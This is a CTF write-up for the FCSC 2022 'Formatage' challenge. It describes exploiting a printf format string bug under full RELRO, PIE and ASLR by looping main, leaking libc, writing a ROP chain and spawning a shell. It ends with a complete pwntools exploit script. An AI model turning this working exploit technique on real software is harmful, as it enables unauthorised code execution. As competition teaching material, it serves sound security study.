## FCSC 20222 - Formatage

### The vulnerability

This challenge takes a very common form. A very tight main with only a string passed a the first parameter to a printf, exitting instantly.

Spotting the vulnerability is easy on this challenge, the vulnerability is a "format string" vulnerability. TL;DR, the first argument of printf is its format string. A string that will format the output its going to give. If I give as printf the format string "My age is: %d\n", by providing a digitas a second parameter (%d), printf will output "My age is: 12\n".
We can use this to write the amount of written data from printf into one of the arguments thanks to the help of the "%n" format.

Printf can take an infinite and undetermined amount of parameter thanks to the help of "va-args". Va-args (variable arguments) is a technology made for that. Va-args will take the given arguments, put them into the stack of printf (or more generally the stack of the function using va-args), and then read them one by one, first to last, and it will be the developper's work to determine which types he will considere those arguments to be. As a note, every parameters will be of the architecture size, if you give a char to a 64bit system, that char will automatically be casted to an 8 bytes value instead of one.

A little side note that will be usefull for later, with printf, you don't have the obligation to de-stack the arguments one by one. You can chose them like an array, using "index\$", as for "\%12\$p", this will print, as a pointer, the 12 argument. But be aware, if you do that, the stack is copied during the process, and not taken as it is.

### Reverse Engineering

This part will be quick.
Thanks to the use of IDA, we get a pseudo-code generation of the binary which gives the vulnerability straight away.

```c
void __noreturn main()
{
  char *v0; // [rsp-20h] [rbp-28h] BYREF
  size_t v1[4]; // [rsp-18h] [rbp-20h] BYREF

  v1[1] = __readfsqword(0x28u);
  v0 = 0LL;
  v1[0] = 0LL;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  getline(&v0, v1, stdin);
  printf(v0);
  if ( v0 )
    free(v0);
  v0 = 0LL;
  exit(0);
}
```

We've got out printf which takes its first argument from a string we control, this is a format string vulnerability.

My CTF experience also makes me notice the uncommon use of getline() for the input, and the fact that we have only one shot by design.

The use of getline will make the exploitation a bit different, we'll get to that part later. The fact that we have only one shot gives away the first step of this challenge: figuring out a way to make the binary loop.

### Exploitation

Here lies the real difficulty of this challenge.

In order to have a write-what-where primitive on those conditions, there is a trick. Since it's getline, our input is not on the stack, it's allocated on the heap, so we can't put our own adresses on the stack and use them as parameters for the format string. But since it's getline, we have virtually infinite format string to give as an input.
Remember when I said the stack is copied only when you use index qualifyers in your format string ? Well, since we have an infinite format string, that means we can just not use them, and spamm "%c" instead (since it will be casted an 8 bytes value by the va-arg). This will allow us to rewrite part on the stack on the fly, while printf is still reading the arguments.

We would, then, have to find to pointers on the stack that leads to another part of the stack which is further from each other, rewrite the lsb of one so it points to a third address, and then use it to write two bytes. Those two bytes will make a fully controlled address that we will be able to use in order to write two other bytes where we want.

```
0x7fffc0f3: 0x7fffdead (we write one byte there, 00)
0x7fffdead: 0x7ffffe00 (we write two bytes at this address now)
0x7ffffe00: 0x000000ad
We repeat the process 4 times (well, 3 actually and write the last one as an int to write the last 00 as padding), which makes
0x7ffffe00: 0xdeadbeef
And then cool ! we can write two bytes at 0xdeadbeef ! Only have to repeat the whole process two more times and we will have written a full pointer at 0xdeadbeef !
```
God I hate format strings.

To make the binary loop, I initially thought of rewriting a section of any ELF binary; the .finit_array. This array stores a function pointer that will be called during exit.

However, this binary has full protection, making this section read-only. Plus, the binary is also PIE'd, which makes the .text non-predictable.
On the stack there is a pointer that leads to a variable which is the the .text base that is used in order to retrieve the .finit_array's address. I tried to play with that pointer in order to change the base address and makes it point to a more convenient address instead, but I couldn't find any that would leads to a correct loop.

I analyzed the whole .text for a while, tried to see how I could write my own base addrress that would lead to my own pointer ret2main, but I couldn't find a way.

After a bit of thinking, found another way: rewriting the lsb of the the return value of printf itself.
This method weren't really an option to me at the beginning, since it will work only one time out of 0xfff thanks to ASLR. That's far from impossible, but that's still a bit of an annoying bruteforce.

We rewrite the value so it points there instead:
```asm
.text:0000000000001230                 mov     rdx, cs:stdin   ; stream
.text:0000000000001237                 lea     rcx, [rbp-10h]
.text:000000000000123B                 lea     rax, [rbp-18h]
.text:000000000000123F                 mov     rsi, rcx        ; n
.text:0000000000001242                 mov     rdi, rax        ; lineptr
.text:0000000000001245                 call    _getline
.text:000000000000124A                 mov     rax, [rbp-18h]
.text:000000000000124E                 mov     rdi, rax        ; format
.text:0000000000001251                 mov     eax, 0
.text:0000000000001256                 call    _printf
```
Just after the setvbuf, and just in time for the getline.

Cool, we have our loop now.
This loop will makes us able to get back to a format string vulnerability, but this time defeating ASLR and PIE.

Now the idea was to rewrite the __free_hook value. If you put a pointer in there, it will be called at the next free, and lucky us, there is one just after.

Or so I thought.

libc2.34, the used library, removed the deprecated __free_hook, __malloc_hook, and all other pwnable hooks for security reasons says the internet.

Okay, not an issue, we can still rewrite the base of the .text that is used to retrieve the .finit_array and put our one_gadget there.

Once done, I realized that at the moment of the call, there is no one_gadget that works with the registers applied.

Damned.

Okay, not an issue, we can still write a rop chain somewhere, increment rsp so it points to our rop chain, clean r15 (the bad register), and call our one gadget.
That worked ! Back to ASLR now, and lezzgo !

After long minutes of bruteforce, a crash given, not a shell.

Damned.

At this point I did the terrible mistake to not sleep in order to finish my exploit as I was certain we were near to the end. So my brain cells were fewer than the usual three.

So, not an issue, we'll be debugging with ASLR on, wait 10  minutes for a debugger to pop within the right conditions, and see what's wrong...
The stack layout was somehow different than with no ASLR, the environment were a lot farther than with ASLR on. That asked for an adjustment from my exploit.

Did it and... Crash.

Okay, not an issue. We'll be debugging more and figure out. Turns out I used a ld-library as a libc leak, which is fine on itself, but with ASLR on, my offset were different than with ASLR off. Fixed it and...

Shell !

God I was happy, couldn't wait to see what would be going wrong during the remote test.

A crash, obviously. I was at the office during that time, and it's at this moment that I realized why the windows couldn't be openned in cyber-security offices.

Well, i was tired, and it took me longer to fix the issue, without the help of debugger with that.

The two suspects from before were at fault again, plus something more, when I was developping the exploit, I spammed "%p" in order to not have to make the math to get my offsets. I obviously didn't replaced them by %c once I had the offsets, making my output variable, and thus, unstable.

But my method weren't at fault, so I kept doing my remote debug, waited 15 minutes after each successfull 0xfff bruteforce, again and again...

And finally passed.

### Conclusion

The exploit was about taking control of printf ret's value in order to loop on the main, have write-what-were primitive thanks to the format string vulnerability, get leaks, put a rop chain somewhere and rewrite .text base address located on the stack to jump in our ropchain to get a shell.

Voydstack, another competitor that did it before me, pointed out that the whole .finit address thing were kind of useless, I could just have keep rewriting the printf's ret value to jump on my rop chain, which is true, guess I was too tired to get that .finit function pointer our of my head. But at the end of day, both methods gets a shell so it's okay.

The real difficulty of this challenge to me was to play around the insane amount of little details that could wreck up an exploit, especially during a high pressure moment such as this kind of competition. With a cooler head, more sleep hours, I'm pretty sure I would have avoid some of them and solve others a lot quicker. It took me about 5 days to solve this challenge. And most of this time was used for stupid things.

Exploit ahead, be carefull for your eyes I don't have the time to clean it up:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template formatage
from pwn import *
from time import sleep

# Set up pwntools for the correct architecture
exe = context.binary = ELF('formatage')
context.terminal = "gnome-terminal -- bash -c".split(" ")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

environ = {
    "PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "HOSTNAME":"formatage",
    "DEBIAN_FRONTEND":"noninteractive",
    "HOME":"/home/ctf",
    "SOCAT_PID":"138223",
    "SOCAT_PPID":"1",
    "SOCAT_VERSION":"1.7.4.1",
    "SOCAT_SOCKADDR":"172.20.8.2",
    "SOCAT_SOCKPORT":"2057",
    "SOCAT_PEERADDR":"10.0.10.3",
    "SOCAT_PEERPORT":"64886",
    }
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return process([exe.path] + argv, env=environ, *a, **kw)
    elif args.REM:
        return remote("challenges.france-cybersecurity-challenge.fr", 2057)
    else:
        return process([exe.path] + argv, env=environ, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *(unsigned long long*)(&printf+198)
b exit
c
d
b *0x7ffff7fd9f00
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

# print(hex(exe.symbols["filter.0"] + 68))

# payload = fmtstr_payload(10, {0x7ffff7e86ccc}, numbwritten=0, write_size="short")
#34
#io.sendline(f"%{i}$p")

8
i = 0

# io = start()

# io.sendline(b"%p - " * 120)
# io.interactive()
# exit(0)

def writeWhatWhere(where, what, start = 0, size="short"):
    where = p64(where)
    if start == 1:
        io.sendline(b"a" * (0xeb78-14) + b"%c" * 14 + b"%hn" + b"a" * 0xfc7  + b"%c" * (31-14) + b"%hhn" + b"%c" * 13 + b"1" * (0xfd3) + b"%hhnstop")
    else:
        io.sendline(b"a" * (0xeb78-14) + b"%c" * 14 + b"%hn" + b"a" * 0xfc7  + b"%c" * (31-14) + b"%hhn" + b"%c" * 13 + b"1" * (0xfd3) + b"%hhnstop")
    io.recvuntil(b"stop")
    io.sendline(b"%c" * 46 + b"a" * 2 + b"%hhn" + b"%c" + b"a" * (u16(where[0:2]) - 0x31) + b"%hnstop")
    io.recvuntil(b"stop")

    if start != 2:
        io.sendline(b"a" * (0xeb78-14) + b"%c" * 14 + b"%hn" + b"a" * (0xfc7+2)  + b"%c" * (31-14) + b"%hhn" + b"%c" * 13 + b"1" * (0xfd3-2) + b"%hhnstop")
    else:
        io.sendline(b"a" * (0xeb78-14) + b"%c" * 14 + b"%hn" + b"a" * (0xfc7+2)  + b"%c" * (31-14) + b"%hhn" + b"%c" * 13 + b"1" * (0xfd3-2) + b"%hhnstop")
    io.recvuntil(b"stop")
    io.sendline(b"%c" * 46 + b"a" * 2 + b"%hhn" + b"%c" + b"a" * (u16(where[2:4]) - 0x31) + b"%hnstop")
    io.recvuntil(b"stop")
    #io.interactive()
    io.sendline(b"a" * (0xeb78-14) + b"%c" * 14 + b"%hn" + b"a" * (0xfc7+4)  + b"%c" * (31-14) + b"%hhn" + b"%c" * 13 + b"1" * (0xfd3-4) + b"%hhnstop")
    io.recvuntil(b"stop")
    io.sendline(b"%c" * 46 + b"a" * 2 + b"%hhn" + b"%c" + b"a" * (u32(where[4:]) - 0x31) + b"%nstop")
    io.recvuntil(b"stop")

    io.sendline(b"%c" * 46 + b"a" * 2 + b"%hhn" + b"a" * (what- 0x30-560) + b"%c" * 560 + (b"%hn" if size == "short" else b"%n" if size == "int" else b"%hhn")+b"stop")
    io.recvuntil(b"stop")

noloop = False
while 1:
    print(i)
    i += 1
    io = start()
    io.sendline(b"a" * (0xeb78-14) + b"%c" * 14 + b"%hn" + b"a" * 0xfc7  + b"%c" * (31-14) + b"%hhn" + b"%c" * 13 + b"1" * (0xfd3) + b"%hhn"+ b"%p - "*30+b"stop")

    x = b""
    try:
        leaks = io.recvuntil(b'stop').split(b" - ")
        stackLeak = int(leaks[1], 16)
        try:
            libcLeak = int(leaks[28], 16)
        except:
            print(leaks)
            print(hex(stackLeak))
            print(len(leaks))
            print("failed")
            io.interactive()
            exit(0)
        libc = ELF("./libc.2-34.so")
        libc.address = libcLeak - 0x22c000

        print(hex(stackLeak))
        print(hex(libcLeak))
        oneGadget = p64(libc.address + 0xeeccc)
        io.sendline(b"%c" * 46 + b"a" * 2 + b"%hhntest")
        #io.sendline(b"test%p")
        x = io.recvuntil(b"test")
    except:
        pass
    if b"test" in x:

        if args.GDB:
            gdb.attach(io, gdbscript="b *(unsigned long long*)(&printf+198)\nb exit\n")
        oneGadget = p64(libc.address + 0x00000000001242ed)
        writeWhatWhere(stackLeak+0x10, u16(oneGadget[0:2]),start=1)
        writeWhatWhere(stackLeak+0x12, u16(oneGadget[2:4]))
        writeWhatWhere(stackLeak+0x14, u16(oneGadget[4:]), size="int")

        newExitIni = p64(stackLeak+0x10-0x3da0)
        writeWhatWhere(libcLeak + 0x36220, u16(newExitIni[0:2]))
        writeWhatWhere(libcLeak + 0x36222, u16(newExitIni[2:4]))
        writeWhatWhere(libcLeak + 0x36224, u16(newExitIni[4:]), size="int")
        

        rop = ROP(libc)
        rop.r15 = libc.address+0xb8
        rop.raw(libc.address + 0xeeccc)

        ropAddr = stackLeak -0xfb0
        ropchain = rop.chain()

        ropchain = [ropchain[i:i+8] for i in range(0, len(ropchain), 8)]
        i = 0
        for x in ropchain:
            writeWhatWhere(ropAddr + (i*8), u16(x[0:2]))
            if i != 1:
                writeWhatWhere(ropAddr + (i*8) + 2, u16(x[2:4]))
            else:
                writeWhatWhere(ropAddr + (i*8) + 2, u16(x[2:4]),start=2)
            writeWhatWhere(ropAddr + (i*8) + 4, u32(x[4:]), size="int")
            i += 1


        #io.sendline(b"%c" * 46 + b"a" * 2 + b"%hhn" + b"%p - " * 620)
        io.interactive()
        break
    try:
        io.close()
    except:
        pass
    if noloop:
        break
```